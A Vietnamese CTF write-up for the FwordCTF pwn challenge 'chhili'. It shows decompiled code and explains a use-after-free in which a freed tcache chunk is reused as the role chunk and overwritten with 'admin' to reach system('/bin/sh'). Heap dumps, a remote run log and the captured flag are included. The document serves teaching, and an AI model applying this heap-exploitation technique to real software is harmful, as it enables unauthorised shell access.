# Phân tích file.

```c
chhili: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c4dea7e3aee78d8ebe2eb75f64baba1c51a70e29, for GNU/Linux 3.2.0, not stripped
```

# Reverse file.

- Bài có 5 chức năng chính:

    ```c
    Select an action
    (1) malloc
    (2) free
    (3) edit
    (4) get shell
    (5) exit
    >>
    ```

    - Malloc():

        ```c
        __int64 create()
        {
          __int64 result; // rax
          _DWORD nbytes[3]; // [rsp+4h] [rbp-9Ch] BYREF
          char buf[136]; // [rsp+10h] [rbp-90h] BYREF
          unsigned __int64 v3; // [rsp+98h] [rbp-8h]

          v3 = __readfsqword(0x28u);
          *(_QWORD *)&nbytes[1] = malloc(0x10uLL);
          puts("size : ");
          printf(">> ");
          __isoc99_scanf("%d", nbytes);
          if ( nbytes[0] > 0 && nbytes[0] <= 127 )
          {
            LODWORD(mySize) = nbytes[0];
            puts("data : ");
            printf(">> ");
            read(0, buf, nbytes[0]);
            **(_QWORD **)&nbytes[1] = malloc(nbytes[0]);
            *(_QWORD *)(*(_QWORD *)&nbytes[1] + 8LL) = malloc(0x10uLL);
            strcpy(**(char ***)&nbytes[1], buf);
          }
          result = *(_QWORD *)&nbytes[1];
          myChunk = *(void **)&nbytes[1];
          return result;
        }
        ```

        - Sẽ malloc cho ta 3 chunk, chunk đầu tiên(0x10) là chứa thông tin gồm địa chỉ chứa data và địa chỉ chứa role, chunk thứ 2(size input) là chunk data, chunk thứ 3(0x10) là chunk role.

        ```c
        0x555555559250  0x0000000000000000      0x0000000000000021      ........!.......
        0x555555559260  0x0000555555559280      0x00005555555592a0      ..UUUU....UUUU..
        0x555555559270  0x0000000000000000      0x0000000000000021      ........!.......
        0x555555559280  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x555555559290  0x0000000061616161      0x0000000000000021      aaaa....!.......
        0x5555555592a0  0x0000000000000000      0x0000000000000000      ................
        0x5555555592b0  0x0000000000000000      0x0000000000020d51      ........Q.......         <-- Top chunk
        ```

    - Free():

        ```c
        void delete()
        {
          if ( myChunk )
          {
            free(*(void **)myChunk);
            free(myChunk);
          }
        }
        ```

        - Free chunk data và chunk thông tin, free nhưng không set null ⇒ bug UAF.
    - Edit():

        ```c
        ssize_t edit()
        {
          ssize_t result; // rax

          result = *(_QWORD *)myChunk;
          if ( *(_QWORD *)myChunk )
          {
            puts("data : ");
            printf(">> ");
            result = read(0, *(void **)myChunk, (unsigned int)mySize);
          }
          return result;
        }
        ```

        - Edit phần data của chunk.
    - Get_shell():

        ```c
        int get_shell()
        {
          if ( !myChunk || !*((_QWORD *)myChunk + 1) )
            return puts("You don't have any role");
          if ( !strncmp(*((const char **)myChunk + 1), "admin", 5uLL) )
            return system("/bin/sh");
          return puts("You don't have the permission to get a shell");
        }
        ```

        - Ta sẽ có được shell nếu role ta là admin.
    - Exit():
        - Thoát chương trình.

    # Exploit.

    - Ta thấy khi malloc sẽ luôn có 2 chunk với size cố định là 0x10 cho thông tin và role và khi free sẽ free data và thông tin, ý tưởng sẽ malloc 1 chunk với size của data là 0x14 để sau khi free sẽ vào bin 0x20, lúc này trong bin 0x20 sẽ có sẵn 2 chunk chờ được malloc.

        ```c
        tcachebins
        0x20 [  2]: 0x555555559260 —▸ 0x555555559280 ◂— 0x0
        ```

    - Tcache bin sẽ cấp phát theo LIFO free sau được malloc trước, vậy nếu ta malloc 1 chunk mới với size của data không nằm trong 0x20 thì 2 chunk này sẽ được malloc cho thông tin và role. Lúc này chunk chứa data trong bin sau khi free sẽ được dùng để malloc cho role. Vậy ta chỉ cần dùng bug UAF edit thành "admin" rồi malloc lại thì role sẽ là admin.

        ```c
        0x555555559250  0x0000000000000000      0x0000000000000021      ........!.......
        0x555555559260  0x00005555555592c0      0x0000555555559280      ..UUUU....UUUU..   data va role
        0x555555559270  0x0000000000000000      0x0000000000000021      ........!.......
        0x555555559280  0x00000a6e696d6461      0x0000000000000000      admin...........   role
        0x555555559290  0x0000000061616161      0x0000000000000021      aaaa....!.......
        0x5555555592a0  0x0000000000000000      0x0000000000000000      ................
        0x5555555592b0  0x0000000000000000      0x0000000000000031      ........1.......
        0x5555555592c0  0x6262626262626262      0x6262626262626262      bbbbbbbbbbbbbbbb   data
        0x5555555592d0  0x6262626262626262      0x0000626262626262      bbbbbbbbbbbbbb..
        0x5555555592e0  0x0000000000000000      0x0000000000020d21      ........!.......         <-- Top chunk
        ```

- Vậy lúc này khi role là admin ta chỉ cần get_shell là được.

    ```c
    [+] Opening connection to 40.71.72.198 on port 1234: Done
    [*] '/mnt/c/Users/ADMIN/Desktop/fword/chhilii/chhili'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    add
    edit
    add
    [*] Switching to interactive mode
    Select an action
    (1) malloc
    (2) free
    (3) edit
    (4) get shell
    (5) exit
    >> FwordCTF{th1s_will_b3_your_f1rSt_st3p_481364972164}
    $
    ```
